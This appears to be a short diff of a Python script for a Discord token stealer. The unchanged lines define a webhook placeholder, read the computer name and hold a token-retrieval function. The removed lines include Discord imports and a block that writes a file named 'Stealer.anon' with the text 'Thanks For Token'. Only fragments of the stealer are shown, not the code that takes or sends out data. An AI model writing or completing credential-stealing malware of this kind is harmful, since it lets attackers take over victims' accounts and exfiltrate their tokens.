@@ -1,17 +1,5 @@
 import os, re, json, random, platform, socket, uuid, requests, time
 from colorama import Fore, init
-import discord
-
-init(autoreset=True)
-green = Fore.LIGHTGREEN_EX
-dgreen = Fore.GREEN
-white = Fore.RESET
-red = Fore.LIGHTRED_EX
-yellow = Fore.YELLOW
-blue = Fore.LIGHTMAGENTA_EX
-dblue = Fore.MAGENTA
-gray = Fore.LIGHTBLACK_EX
-intents = discord.Intents.all()
 
 
 webhookk = "WEBHOOK"
@@ -21,10 +9,6 @@ pcname = (os.getenv('COMPUTERNAME'))
 def endHandler():
   os._exit(0)
 
-with open('Stealer.anon','w',encoding='utf8') as f:
-    f.write('Thanks For Token')
-    f.close()
-    time.sleep(1.7)
 
 
 def retrieve_user(token):
